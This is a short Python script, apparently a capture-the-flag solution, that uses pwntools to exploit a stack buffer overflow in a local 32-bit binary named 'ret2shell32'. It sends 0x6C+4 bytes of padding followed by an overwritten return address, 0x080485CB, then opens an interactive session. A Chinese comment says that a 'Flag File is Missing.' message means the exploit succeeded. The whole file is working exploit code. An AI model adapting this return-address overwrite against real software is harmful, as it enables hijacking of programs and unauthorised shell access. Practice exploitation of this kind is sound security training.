from pwn import *
p = process('./ret2shell32')
context.log_level="debug"

payload=(0x6C+4)*b'a'+p32(0x080485CB)
p.sendlineafter("Please enter your string:",payload)
p.interactive()
#你的当前文件夹下没有flag，显示Flag File is Missing.就代表通了



